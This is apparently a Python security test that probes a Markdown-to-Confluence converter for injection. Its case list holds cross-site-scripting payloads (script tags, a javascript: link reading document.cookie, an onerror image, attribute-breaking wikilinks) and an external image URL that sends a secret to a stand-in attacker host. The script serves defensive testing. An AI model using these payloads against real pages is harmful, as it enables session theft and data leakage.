"""Probe confluence_push.to_storage for injection: raw HTML, macros, javascript: links, external images."""
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "scripts"))

import confluence_push as cp  # noqa: E402

resolver = cp.LinkResolver({"wiki/topics/캐시.md": "[KB] 캐시"}, "http://127.0.0.1:1")
cases = {
    "raw_html": "<script>alert(1)</script> <ac:structured-macro ac:name=\"html\"/>",
    "js_link": "[click](javascript:alert(document.cookie))",
    "ext_image": "![x](https://attacker.example/c?d=SECRET)",
    "data_link": "[d](data:text/html;base64,PHNjcmlwdD4=)",
    "autolink": "<https://attacker.example/x>",
    "wikilink_quote": "[[topics/캐시|a\" onmouseover=\"x]]",
    "wikilink_cdata": "[[topics/캐시|]]>]]><b>x</b>]]",
    "jira_alias": "[[KB-12|<img src=x onerror=alert(1)>]]",
    "entity": "&nbsp; &bogus; &#0; &lt;",
}
for name, md in cases.items():
    try:
        out = cp.to_storage(md + "\n", resolver)
    except Exception as exc:
        out = f"RAISES {type(exc).__name__}: {exc}"
    print(f"{name:15} {out.strip()}")

js = cp.to_storage(cases["js_link"] + "\n", resolver)
img = cp.to_storage(cases["ext_image"] + "\n", resolver)
if "javascript:" in js or "attacker.example" in img:
    print("FAIL (C-42): javascript: links and external images reach the Confluence storage format unfiltered")
    raise SystemExit(1)
print("OK")
